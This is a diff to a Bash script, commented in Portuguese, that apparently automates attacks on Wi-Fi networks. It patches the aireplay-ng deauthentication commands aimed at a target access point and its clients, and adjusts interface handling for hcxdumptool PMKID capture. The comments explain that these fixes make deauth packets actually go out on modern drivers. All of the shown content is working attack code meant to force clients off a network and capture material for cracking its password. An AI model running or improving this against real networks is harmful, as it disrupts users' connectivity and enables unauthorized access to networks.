@@ -783,7 +783,12 @@ capturar_handshake() {
             cliente="$(cliente_do_alvo)"
             if [[ -n "$cliente" ]]; then
                 log "Tentativa $((tentativas+1)): cliente ${cliente} detectado — deauth DIRECIONADO (pode não funcionar em redes com PMF/802.11w ou canais DFS)..."
-                if timeout --kill-after=5 20s aireplay-ng --deauth 5 -a "${TARGET_BSSID}" -c "${cliente}" "${MONIFACE}" &>>"$LOGFILE"; then
+                # --ignore-negative-one: em drivers mac80211 modernos (ex. mt7921e),
+                # o aireplay-ng não consegue ler o canal atual pelas ioctls antigas e
+                # trava achando estar no canal -1 ("Couldn't determine current
+                # channel"), falhando SEMPRE mesmo com cliente real detectado. Sem
+                # essa flag, nenhum deauth é enviado de fato nessas placas.
+                if timeout --kill-after=5 20s aireplay-ng --ignore-negative-one --deauth 5 -a "${TARGET_BSSID}" -c "${cliente}" "${MONIFACE}" &>>"$LOGFILE"; then
                     DEAUTH_ESTADO="comando_concluido"
                     log "Deauthentication: comando concluído; efeito ainda não confirmado."
                 else
@@ -793,7 +798,7 @@ capturar_handshake() {
                 fi
             else
                 log "Tentativa $((tentativas+1)): cliente conectado detectado (sem MAC específico) — deauth broadcast..."
-                if timeout --kill-after=5 20s aireplay-ng --deauth 5 -a "${TARGET_BSSID}" "${MONIFACE}" &>>"$LOGFILE"; then
+                if timeout --kill-after=5 20s aireplay-ng --ignore-negative-one --deauth 5 -a "${TARGET_BSSID}" "${MONIFACE}" &>>"$LOGFILE"; then
                     DEAUTH_ESTADO="comando_concluido"
                     log "Deauthentication: comando concluído; efeito ainda não confirmado."
                 else
@@ -1307,9 +1312,12 @@ rota_pmkid() {
     # MONIFACE == IFACE, sem passar pelo airmon-ng nesse trecho específico.
     log "Saindo do modo monitor (hcxdumptool precisa da interface física crua)..."
     if [[ "${MONIFACE}" == "${IFACE}" ]]; then
+        # NÃO subimos a interface (sem "ip link set up") de propósito: o
+        # hcxdumptool "arma" (ativa monitor + sobe) a interface sozinho ao
+        # iniciar. Deixá-la já "up" em modo managed antes dele mexer causava
+        # "failed to arm interface" — ele espera recebê-la PARADA.
         ip link set "${IFACE}" down &>>"$LOGFILE"
         iw dev "${IFACE}" set type managed &>>"$LOGFILE"
-        ip link set "${IFACE}" up &>>"$LOGFILE"
     else
         airmon-ng stop "${MONIFACE}" &>>"$LOGFILE"
     fi
